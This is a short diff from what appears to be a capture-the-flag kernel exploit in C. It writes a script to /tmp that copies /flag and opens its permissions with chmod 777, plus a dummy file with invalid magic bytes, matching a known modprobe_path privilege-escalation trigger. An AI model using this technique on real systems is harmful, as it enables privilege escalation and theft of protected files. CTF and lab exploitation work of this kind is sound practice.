@@ -125,7 +125,7 @@ void environ_set(void){
     system("echo '#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/exp");//细节1：运行bash脚本前必须添加上 #!/bin/sh 否则触发了也不执行。
     system("chmod +x /tmp/exp");
 
-    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
+    system("printf '\xff\xff\xff\xff'  > /tmp/dummy");
     system("chmod +x /tmp/dummy");
     //exit(0);
 }
